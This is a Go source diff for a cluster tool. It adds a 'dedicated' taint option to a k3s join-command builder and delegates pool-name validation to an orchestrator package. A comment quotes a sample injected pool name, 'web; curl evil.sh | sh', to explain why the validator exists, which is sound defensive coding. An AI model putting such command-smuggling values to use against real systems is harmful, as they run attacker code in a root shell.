@@ -14,7 +14,6 @@ import (
 	"fmt"
 	"log/slog"
 	"net/url"
-	"regexp"
 	"strings"
 
 	"github.com/google/uuid"
@@ -22,6 +21,7 @@ import (
 	"github.com/jackc/pgx/v5/pgtype"
 	"github.com/jackc/pgx/v5/pgxpool"
 
+	"github.com/codeblocktz/yacht/internal/orchestrator"
 	"github.com/codeblocktz/yacht/internal/secret"
 	"github.com/codeblocktz/yacht/internal/store/dbgen"
 )
@@ -37,14 +37,10 @@ var ErrNotConfigured = errors.New("cluster: no join settings are stored")
 var ErrNoSecretKey = errors.New(
 	"cluster: no YACHT_SECRET_KEY is configured, so a join token cannot be stored safely")
 
-// PoolLabel is the node label a pool is carried in.
-const PoolLabel = "yacht/pool"
-
-// A Kubernetes label value, which is also the shape that makes a pool safe to
-// interpolate into a command somebody pastes into a root shell. Every
-// character that could end the command and start another one — a semicolon, a
-// backtick, a newline, a space, a dollar — is outside this set already.
-var poolRE = regexp.MustCompile(`^[a-z0-9]([-a-z0-9._]*[a-z0-9])?$`)
+// PoolLabel is the node label a pool is carried in. The orchestrator's, since
+// placing apps by it is the orchestrator's half; named here too because this
+// is where it is written onto a machine.
+const PoolLabel = orchestrator.PoolLabel
 
 // Joiner stores the join settings and builds the command.
 type Joiner struct {
@@ -133,7 +129,9 @@ func (j *Joiner) SetJoin(ctx context.Context, serverURL, token string, by uuid.U
 // The returned string contains the join token in the clear, because that is
 // what the person running it needs. It is the only thing in this package that
 // carries the token, and the only caller is the page an owner asked for.
-func (j *Joiner) Command(ctx context.Context, pool string) (string, error) {
+//
+// dedicated keeps the machine for its pool's apps; see BuildCommand.
+func (j *Joiner) Command(ctx context.Context, pool string, dedicated bool) (string, error) {
 	if err := ValidatePool(pool); err != nil {
 		return "", err
 	}
@@ -160,19 +158,32 @@ func (j *Joiner) Command(ctx context.Context, pool string) (string, error) {
 		return "", fmt.Errorf("cluster: opening the join token: %w", err)
 	}
 
-	return BuildCommand(row.ServerUrl, token, pool), nil
+	return BuildCommand(row.ServerUrl, token, pool, dedicated), nil
 }
 
 // BuildCommand assembles the join line.
 //
-// Split out from Command so the interesting half — turning three values into
+// Split out from Command so the interesting half — turning these values into
 // something that will be pasted into a root shell — is a pure function with no
 // database and no cluster behind it.
-func BuildCommand(serverURL, token, pool string) string {
+//
+// A pool labels the machine, and a team placed on that pool runs there; any
+// other team's apps may still land on it, which is right for a pool that is
+// shared. dedicated also taints it, so the scheduler keeps everything off it
+// except the apps that tolerate the taint — those of teams placed on the pool.
+// Dedicated means nothing without a pool, and is ignored there.
+//
+// The pool goes in unquoted, twice when dedicated, and that is safe only
+// because ValidatePool has refused anything a shell would read as more than a
+// name. Command checks it; a caller building the line itself must too.
+func BuildCommand(serverURL, token, pool string, dedicated bool) string {
 	cmd := "curl -sfL https://get.k3s.io | K3S_URL=" + serverURL +
 		" K3S_TOKEN=" + token + " sh -s -"
 	if pool != "" {
 		cmd += " --node-label " + PoolLabel + "=" + pool
+		if dedicated {
+			cmd += " --node-taint " + PoolLabel + "=" + pool + ":NoSchedule"
+		}
 	}
 	return cmd
 }
@@ -208,18 +219,9 @@ func ValidateServerURL(raw string) error {
 // The rule is Kubernetes' own for a label value, which happens to exclude
 // every character that could end the command and start another one. A pool
 // called `web; curl evil.sh | sh` is refused here rather than quoted and hoped
-// over, because the result is pasted into a root shell.
+// over, because the result is pasted into a root shell. The rule itself is the
+// orchestrator's, so the pool a team's apps are placed on is held to exactly
+// the one a machine is labelled with.
 func ValidatePool(pool string) error {
-	if pool == "" {
-		return nil // no label, which is a normal node
-	}
-	if len(pool) > 63 {
-		return errors.New("pool name must be at most 63 characters")
-	}
-	if !poolRE.MatchString(pool) {
-		return errors.New(
-			"pool name must be lowercase letters, numbers, dashes, dots and underscores, " +
-				"starting and ending with a letter or number")
-	}
-	return nil
+	return orchestrator.ValidatePool(pool)
 }
